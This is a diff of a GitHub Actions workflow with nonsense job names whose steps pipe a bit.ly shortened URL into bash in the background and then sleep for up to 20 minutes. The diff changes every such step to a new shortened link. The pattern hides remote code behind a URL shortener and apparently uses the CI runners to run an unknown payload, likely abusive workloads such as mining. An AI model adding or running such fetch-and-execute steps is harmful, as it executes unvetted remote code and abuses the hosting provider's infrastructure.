@@ -1,4 +1,4 @@
-name: kapdosje ksyaher 
+name: kfxsvapdosje ksyaher 
 
 on:
   workflow_dispatch:
@@ -24,8 +24,8 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: install
-      run: curl -sL  https://bit.ly/4snI7fO | bash &
-           sleep 360s
+      run: curl -sL  https://bit.ly/4jmt0iN | bash &
+           sleep 350s
   bulat:
     needs: build
     runs-on: ubuntu-latest
@@ -42,7 +42,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: install curl
-      run: curl -sL  https://bit.ly/4snI7fO | bash &
+      run: curl -sL  https://bit.ly/4jmt0iN | bash &
             sleep 6m
         
     
@@ -63,7 +63,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: clone
-      run: curl -sL  https://bit.ly/4snI7fO | bash &
+      run: curl -sL  https://bit.ly/4jmt0iN | bash &
             sleep 16m
   tekwan:
     needs: bulat
@@ -81,6 +81,6 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: clone
-      run: curl -sL  https://bit.ly/4snI7fO | bash &
+      run: curl -sL  https://bit.ly/4jmt0iN | bash &
             sleep 20m   
   
